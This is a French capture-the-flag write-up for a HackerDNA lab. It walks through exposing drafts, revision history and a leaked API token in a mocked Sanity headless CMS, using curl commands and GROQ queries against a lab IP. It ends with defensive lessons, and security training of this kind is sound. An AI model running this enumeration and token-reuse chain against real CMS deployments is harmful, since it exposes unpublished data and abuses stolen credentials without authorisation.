# Compte rendu : Fuite Mythos - Exposition des brouillons d'un CMS headless

Plateforme : HackerDNA
Auteur : SRH
Catégorie : Sécurité Web & API (https://hackerdna.com/fr/labs/fuite-mythos)
Difficulté : Moyenne
Tags : CMS headless, Sanity, API GROQ, énumération, fuite de données, brouillons, historique de révisions, vol de token, dataset interne
XP : +400 XP

## Scénario
Un grand laboratoire d'IA laisse fuir un modèle de pointe non publié via son CMS headless (Sanity). La page publique ne révèle rien, mais l'API expose des brouillons et un historique de révisions. L'objectif est de retrouver le flag utilisateur dans les brouillons, puis d'exploiter un token API caché dans l'historique pour accéder au dataset interne et récupérer le flag root.

Prérequis : curl, jq (optionnel), compréhension de l'API Sanity (GROQ, drafts, transactions).

## Chaîne d'Attaque
[Fingerprint CMS] → [Découverte projectId/dataset] → [Requête GROQ sur les brouillons] → [Flag utilisateur] → [Journal des transactions] → [Récupération du token dans l'historique] → [Dataset interne] → [Flag root] → 🚩

## Étape 1 — Fingerprint du CMS et découverte du Project ID
La page d'accueil est un site marketing (Next.js). Le chunk JavaScript contient la configuration du client Sanity.

curl -s http://<IP>/ | grep -oE '/_next/static/chunks/pages/_app-[a-z0-9]+\.js'

Une fois le chunk identifié, on cherche le projectId et le dataset :

curl -s http://<IP>/_next/static/chunks/pages/_app-XXXX.js | grep -oE 'projectId: "[^"]+"|dataset: "[^"]+"'

Résultat attendu : projectId: "<PROJECT_ID>", dataset: "production".

## Étape 2 — Énumération des brouillons via l'API Sanity
L'API Sanity est mockée localement sous /<PROJECT_ID>.api.sanity.io/. On interroge les brouillons (drafts) avec une requête GROQ :

curl -s "http://<IP>/<PROJECT_ID>.api.sanity.io/v2021-10-21/data/query/production?query=*%5B_id%20in%20path(%27drafts.**%27)%5D"

Résultat attendu : un JSON contenant le brouillon drafts.featurePhilanthropic avec le USER FLAG et un indice : le document drafts.internalBriefing a été supprimé, mais son historique est toujours présent dans le journal des transactions.

## Étape 3 — Récupération de la révision du document supprimé
On interroge le journal des transactions pour drafts.internalBriefing :

curl -s "http://<IP>/<PROJECT_ID>.api.sanity.io/v2021-10-21/data/history/production/transactions/drafts.internalBriefing"

Résultat attendu : des lignes NDJSON. On repère la révision de création (par exemple rev-121b279bc8fd) avant la suppression.

## Étape 4 — Snapshot du briefing et vol du token
On demande le snapshot du document à cette révision :

curl -s "http://<IP>/<PROJECT_ID>.api.sanity.io/v2021-10-21/data/history/production/documents/drafts.internalBriefing?revision=<REVISION>"

Résultat attendu : le contenu du briefing (redacted), mais les métadonnées author.notes contiennent un token API (format sk...).

## Étape 5 — Flag root via le dataset interne
On utilise le token volé pour interroger le dataset interne (souvent nommé internal) :

curl -s -H "Authorization: Bearer <TOKEN_VOLE>" "http://<IP>/<PROJECT_ID>.api.sanity.io/v2021-10-21/data/query/internal?query=*"

Résultat attendu : un JSON contenant le ROOT FLAG dans un document de briefing de lancement.

## Conclusion
Ce lab illustre une fuite de données via un CMS headless mal configuré. Les brouillons et l'historique de révisions sont accessibles sans authentification, et un token API oublié dans les métadonnées permet d'accéder à un dataset interne. La chaîne ne nécessite aucun outil lourd, seulement curl et une compréhension de l'API Sanity.

## Leçons Apprises
1. Toujours vérifier si les brouillons (drafts) sont exposés publiquement via l'API.
2. L'historique des révisions (data/history/...) persiste même après suppression d'un document.
3. Ne jamais stocker de secrets (tokens API) dans des champs de contenu comme author.notes.
4. Restreindre l'accès aux datasets internes avec des tokens en lecture seule et des permissions minimales.
5. Un CMS headless mal configuré peut exposer bien plus que le contenu publié.

Les noms des défis et toute propriété intellectuelle de tiers restent la propriété de leurs détenteurs respectifs.
